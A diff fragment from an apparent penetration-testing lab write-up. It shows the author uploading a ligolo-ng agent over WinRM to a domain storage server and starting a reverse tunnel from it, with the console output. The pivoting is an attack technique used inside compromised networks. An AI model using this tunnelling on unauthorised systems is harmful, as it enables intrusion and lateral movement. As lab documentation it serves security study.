@@ -928,5 +928,14 @@ Ill then upload the agent via winrm on the storage server
 Then ill execute the agent to connect back to me, port `11601` is the default listening port for ligolo
 
 ```python
-
+ligolo-ng » INFO[0280] Agent joined.                                 id=0e8e17f72bdb name="NOVAFORGE\\ryan.collins@STORAGE" remote="10.0.0.101:49863"
+ligolo-ng » 
+ligolo-ng » session
+? Specify a session : 1 - NOVAFORGE\ryan.collins@STORAGE - 10.0.0.101:49863 - 0e8e17f72bdb
+[Agent : NOVAFORGE\ryan.collins@STORAGE] » tunnel_start --tun novaforge
+INFO[0355] Starting tunnel to NOVAFORGE\ryan.collins@STORAGE (0e8e17f72bdb) 
+[Agent : NOVAFORGE\ryan.collins@STORAGE] »
 ```
+
+Then soon after i get a agent joined alert, in which case i can selection session using the `session` command then start the tunnel!
+
